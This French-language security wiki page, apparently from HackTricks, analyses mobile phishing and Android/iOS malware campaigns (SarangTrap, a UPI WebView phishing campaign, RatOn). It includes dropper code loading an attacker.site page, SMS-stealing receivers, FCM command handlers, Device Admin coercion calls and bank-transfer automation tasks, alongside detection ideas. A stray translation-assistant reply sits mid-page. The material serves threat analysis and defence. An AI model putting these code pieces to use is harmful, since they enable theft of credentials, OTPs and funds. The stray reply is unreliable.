# Phishing mobile & distribution d'applications malveillantes (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page couvre les techniques utilisées par des acteurs malveillants pour distribuer **malicious Android APKs** et **iOS mobile-configuration profiles** via phishing (SEO, social engineering, fausses boutiques, applications de rencontre, etc.).
> Le contenu est adapté de la campagne SarangTrap exposée par Zimperium zLabs (2025) et d'autres recherches publiques.

## Flux d'attaque

1. **Infrastructure SEO / Phishing**
* Enregistrer des dizaines de domaines ressemblants (dating, cloud share, car service…).
– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour améliorer le ranking sur Google.
– Héberger *à la fois* les instructions d'installation Android (`.apk`) et iOS sur la même page de destination.
2. **Téléchargement — première étape**
* Android : lien direct vers un APK *non signé* ou d'un “third-party store”.
* iOS : `itms-services://` ou lien HTTPS simple vers un **mobileconfig** malveillant (voir ci‑dessous).
3. **Ingénierie sociale post-installation**
* Au premier lancement, l'app demande un **code d'invitation / de vérification** (illusion d'accès exclusif).
* Le code est **POSTé en clair HTTP** vers le Command-and-Control (C2).
* Le C2 répond `{"success":true}` ➜ le malware poursuit son exécution.
* L'analyse dynamique sandbox / AV qui ne soumet jamais un code valide ne voit **aucun comportement malveillant** (évasion).
4. **Abus des permissions à l'exécution (Android)**
* Les permissions dangereuses ne sont demandées **qu'après réponse positive du C2** :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Les variantes récentes **suppriment `<uses-permission>` pour SMS dans `AndroidManifest.xml`** mais laissent le chemin Java/Kotlin qui lit les SMS via reflection ⇒ baisse le score statique tout en restant fonctionnel sur des appareils où la permission est accordée via un abus d'`AppOps` ou sur d'anciens targets.
5. **Interface façade & collecte en arrière-plan**
* L'app affiche des vues inoffensives (visionneuse SMS, sélecteur de galerie) implémentées localement.
* Pendant ce temps elle exfiltre :
- IMEI / IMSI, numéro de téléphone
- Dump complet de `ContactsContract` (tableau JSON)
- JPEG/PNG depuis `/sdcard/DCIM` compressés avec [Luban](https://github.com/Curzibn/Luban) pour réduire la taille
- Contenu SMS optionnel (`content://sms`)
Les payloads sont archivés par lot (zip) et envoyés via `HTTP POST /upload.php`.
6. **Technique de livraison iOS**
* Un seul **mobile-configuration profile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. pour inscrire l'appareil dans une supervision de type “MDM”.
* Instructions d'ingénierie sociale :
1. Ouvrir Réglages ➜ *Profile downloaded*.
2. Taper *Install* trois fois (captures d'écran sur la page de phishing).
3. Faire confiance au profile non signé ➜ l'attaquant obtient les droits *Contacts* & *Photo* sans revue App Store.
7. **Couche réseau**
* HTTP en clair, souvent sur le port 80 avec un header HOST du type `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Tests défensifs / Conseils Red-Team

* **Bypass d'analyse dynamique** – Pendant l'évaluation du malware, automatiser la phase du code d'invitation avec Frida/Objection pour atteindre la branche malveillante.
* **Diff Manifest vs. Runtime** – Comparer `aapt dump permissions` avec le résultat runtime de `PackageManager#getRequestedPermissions()` ; l'absence de permissions dangereuses est un signal d'alerte.
* **Canari réseau** – Configurer `iptables -p tcp --dport 80 -j NFQUEUE` pour détecter des rafales de POST suspects après saisie du code.
* **Inspection mobileconfig** – Utiliser `security cms -D -i profile.mobileconfig` sur macOS pour lister `PayloadContent` et repérer des entitlements excessifs.

## Idées de détection Blue-Team

* **Certificate Transparency / DNS Analytics** pour repérer des flambées soudaines de domaines riches en mots-clés.
* **User-Agent & Path Regex** : `(?i)POST\s+/(check|upload)\.php` provenant de clients Dalvik hors Google Play.
* **Télémétrie du code d'invitation** – Des POST de codes numériques de 6–8 chiffres peu après l'installation d'un APK peuvent indiquer une phase de staging.
* **Signature MobileConfig** – Bloquer les profils de configuration non signés via une politique MDM.

## Extrait Frida utile : contournement automatique du code d'invitation
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicateurs (Générique)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Chaîne de diffusion via des plateformes de confiance
- YouTube video lure → la description contient un lien court
- Shortlink → site de phishing GitHub Pages imitant le portail légitime
- Le même repo GitHub héberge un APK avec un faux badge “Google Play” pointant directement vers le fichier
- Pages de phishing dynamiques hébergées sur Replit ; canal de commande à distance utilisant Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Le premier APK est un installateur (dropper) qui contient le vrai malware à `assets/app.apk` et incite l'utilisateur à désactiver le Wi‑Fi/données mobiles pour atténuer la détection dans le cloud.
- Le payload embarqué s'installe sous une étiquette anodine (par ex., “Secure Update”). Après l'installation, l'installateur et le payload sont présents en tant qu'apps séparées.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Découverte dynamique des endpoints via shortlink
- Malware récupère depuis un shortlink une liste en texte brut, séparée par des virgules, d'endpoints actifs ; de simples transformations de chaînes produisent le chemin final de la page de phishing.

Exemple (sanitisé) :
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code :
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Collecte d'identifiants UPI basée sur WebView
- L'étape “Effectuer un paiement de ₹1 / UPI‑Lite” charge un formulaire HTML malveillant depuis l'endpoint dynamique à l'intérieur d'une WebView et capture les champs sensibles (téléphone, banque, PIN UPI) qui sont envoyés en `POST` vers `addup.php`.

Chargeur minimal :
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagation et interception des SMS/OTP
- Des autorisations agressives sont demandées au premier lancement:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Les contacts sont parcourus en boucle pour envoyer massivement des smishing SMS depuis l'appareil de la victime.
- Les SMS entrants sont interceptés par un broadcast receiver et téléversés avec des métadonnées (sender, body, SIM slot, per-device random ID) vers `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) comme C2 résilient
- Le payload s'enregistre auprès de FCM ; les messages push contiennent un champ `_type` utilisé comme commutateur pour déclencher des actions (p. ex., mettre à jour les templates de texte de phishing, activer/désactiver des comportements).

Exemple de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquisse du handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Schémas de chasse et IOCs
- L'APK contient un payload secondaire dans `assets/app.apk`
- WebView charge un paiement depuis `gate.htm` et exfiltrates vers `/addup.php`
- Exfiltration de SMS vers `/addsm.php`
- Récupération de config via shortlink (p.ex., `rebrand.ly/*`) retournant des endpoints CSV
- Apps étiquetées comme génériques «Update/Secure Update»
- Messages FCM `data` avec un discriminateur `_type` dans des apps non fiables

### Idées de détection et défense
- Signaler les apps qui demandent aux utilisateurs de désactiver le réseau pendant l'installation, puis effectuent un side-load d'un second APK depuis `assets/`.
- Alerter sur le tuple de permissions : `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flux de paiement basés sur WebView.
- Surveillance de l'egress pour `POST /addup.php|/addsm.php` sur des hôtes non-corporate ; bloquer l'infrastructure connue.
- Règles Mobile EDR : app non fiable enregistrée pour FCM et faisant des branches sur le champ `_type`.

---

## Abus Android Accessibility/Overlay & Device Admin, automatisation ATS et orchestration de relay NFC – étude de cas RatOn

La campagne RatOn banker/RAT (ThreatFabric) est un exemple concret de la façon dont les opérations modernes de phishing mobile combinent WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, et même l'orchestration de NFC-relay. Cette section abstrait les techniques réutilisables.

### Stage-1: WebView → native install bridge (dropper)
Les attaquants présentent un WebView pointant vers une page d'attaquant et injectent une interface JavaScript qui expose un installateur natif. Un tap sur un bouton HTML appelle du code natif qui installe un APK de seconde étape inclus dans les assets du dropper puis le lance directement.

Schéma minimal:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Je n’ai reçu aucun HTML à traduire. Peux-tu coller ici le contenu HTML (ou le fichier) que tu veux que je traduise en français ?

Rappel des règles que je suivrai : je ne traduis pas le code, les noms de techniques, les balises markdown/html, les liens, les chemins, ni les mots comme leak, pentesting, ni les noms de plateformes cloud/SaaS.
```html
<button onclick="bridge.installApk()">Install</button>
```
Après l'installation, le dropper démarre le payload via un package/activity explicite :
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea : des applications non fiables appelant `addJavascriptInterface()` et exposant des méthodes de type installer au WebView ; APK livrant une charge secondaire embarquée sous `assets/` et invoquant la Package Installer Session API.

### Entonnoir de consentement : Accessibility + Device Admin + demandes runtime subséquentes
Stage-2 ouvre un WebView qui héberge une page “Access”. Son bouton invoque une méthode exportée qui dirige la victime vers les paramètres Accessibility et demande l'activation du service rogue. Une fois accordé, malware utilise Accessibility pour cliquer automatiquement à travers les boîtes de dialogue de permissions runtime suivantes (contacts, overlay, manage system settings, etc.) et demande Device Admin.

- Accessibility permet, de manière programmatique, d'accepter les invites ultérieures en trouvant des boutons comme “Allow”/“OK” dans l'arbre de nœuds (node-tree) et en déclenchant des clics.
- Vérification/demande de la permission Overlay :
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Voir aussi :

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Les opérateurs peuvent émettre des commandes pour :
- rendre une superposition plein écran à partir d'une URL, ou
- transmettre du HTML inline chargé dans une superposition WebView.

Usages probables : coercition (saisie de PIN), ouverture de wallet pour capturer les PIN, messages d'extorsion. Garder une commande pour s'assurer que la permission d'overlay est accordée si elle manque.

### Remote control model – text pseudo-screen + screen-cast
- Bande passante faible : exporter périodiquement l'Accessibility node tree, sérialiser les textes/rôles/bornes visibles et les envoyer au C2 comme pseudo-écran (commandes comme `txt_screen` une fois et `screen_live` en continu).
- Haute fidélité : demander MediaProjection et démarrer le screen-casting/enregistrement à la demande (commandes comme `display` / `record`).

### ATS playbook (bank app automation)
Étant donné une tâche JSON, ouvrir l'application bancaire, piloter l'UI via Accessibility avec un mélange de requêtes textuelles et de taps par coordonnées, et saisir le PIN de paiement de la victime lorsque demandé.

Exemple de tâche :
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemples de textes vus dans un flux cible (CZ → EN):
- "Nová platba" → "Nouveau paiement"
- "Zadat platbu" → "Saisir le paiement"
- "Nový příjemce" → "Nouveau bénéficiaire"
- "Domácí číslo účtu" → "Numéro de compte national"
- "Další" → "Suivant"
- "Odeslat" → "Envoyer"
- "Ano, pokračovat" → "Oui, continuer"
- "Zaplatit" → "Payer"
- "Hotovo" → "Terminé"

Les opérateurs peuvent aussi vérifier/augmenter les limites de transfert via des commandes comme `check_limit` et `limit` qui naviguent de façon similaire dans l'interface des limites.

### Crypto wallet seed extraction
Cibles comme MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow : déverrouiller (PIN volé ou mot de passe fourni), naviguer vers Security/Recovery, révéler/afficher la phrase de récupération, keylog/exfiltrate it. Implémentez des sélecteurs sensibles à la locale (EN/RU/CZ/SK) pour stabiliser la navigation entre les langues.

### Device Admin coercion
Les Device Admin APIs sont utilisées pour augmenter les opportunités de capture du PIN et frustrer la victime :

- Verrouillage immédiat:
```java
dpm.lockNow();
```
- Faire expirer les identifiants actuels pour forcer le changement (Accessibility capture le nouveau PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forcer le déverrouillage non biométrique en désactivant les fonctionnalités biométriques du keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Remarque : De nombreux contrôles de DevicePolicyManager nécessitent Device Owner/Profile Owner sur les versions récentes d'Android ; certaines builds OEM peuvent être plus laxistes. Validez toujours sur l'OS/OEM cible.

### Orchestration de relais NFC (NFSkate)
Stage-3 peut installer et lancer un module NFC-relay externe (par ex., NFSkate) et lui fournir même un template HTML pour guider la victime pendant le relais. Cela permet des cash-outs sans contact en présence de la carte (card-present) parallèlement à des ATS en ligne.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Jeu de commandes opérateur (exemple)
- UI/état: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Idées de détection et de défense (style RatOn)
- Rechercher les WebViews utilisant `addJavascriptInterface()` qui exposent des méthodes d'installer/de permission ; les pages se terminant par “/access” qui déclenchent des invites Accessibility.
- Alerter sur les apps qui génèrent des gestes/clics Accessibility à haut débit peu après l'octroi de l'accès au service ; ou une télémétrie ressemblant à des dumps de nœuds Accessibility envoyés au C2.
- Surveiller les modifications de policy Device Admin dans les apps non fiables : `lockNow`, expiration de mot de passe, basculement des fonctionnalités du keyguard.
- Alerter sur les invites MediaProjection provenant d'apps non-corporate suivies d'uploads périodiques de frames.
- Détecter l'installation/le lancement d'une app NFC-relay externe déclenchée par une autre app.
- Pour le secteur bancaire : imposer des confirmations out-of-band, le liage biométrique et des limites de transaction résistantes à l'automatisation on-device.

## Références

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
